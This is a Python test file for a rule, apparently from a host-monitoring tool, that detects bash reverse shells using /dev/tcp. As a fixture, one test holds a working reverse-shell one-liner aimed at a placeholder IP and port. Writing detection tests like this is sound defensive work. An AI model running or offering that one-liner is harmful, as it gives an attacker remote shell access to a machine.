"""Tests for the reverse-shell LOLBin rule."""

from __future__ import annotations

from inspectord.parsers.base import build_event
from inspectord.rules.base import EvalContext
from inspectord.rules.starter_pack.lolbin_reverse_shell import RULE


def test_fires_on_bash_dev_tcp_pattern() -> None:
    ev = build_event(
        module="process_collector",
        action="process_start",
        category=["process"],
        type_=["start"],
        severity="info",
        process={
            "pid": 1234,
            "name": "bash",
            "command_line": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
        },
    )
    matches = RULE.evaluate(EvalContext(event=ev, history=[]))
    assert len(matches) == 1
    assert matches[0].severity == "critical"
    assert matches[0].rule_id == "lolbin.bash_dev_tcp"
    assert "1.2.3.4" in matches[0].short


def test_does_not_fire_on_unrelated_bash() -> None:
    ev = build_event(
        module="process_collector",
        action="process_start",
        category=["process"],
        type_=["start"],
        severity="info",
        process={"pid": 1234, "name": "bash", "command_line": "bash -c 'echo ok'"},
    )
    assert RULE.evaluate(EvalContext(event=ev, history=[])) == []


def test_does_not_fire_for_non_bash_process() -> None:
    ev = build_event(
        module="process_collector",
        action="process_start",
        category=["process"],
        type_=["start"],
        severity="info",
        process={
            "pid": 1234,
            "name": "python",
            "command_line": "python -c 'open(\"/dev/tcp/x/y\")'",
        },
    )
    assert RULE.evaluate(EvalContext(event=ev, history=[])) == []
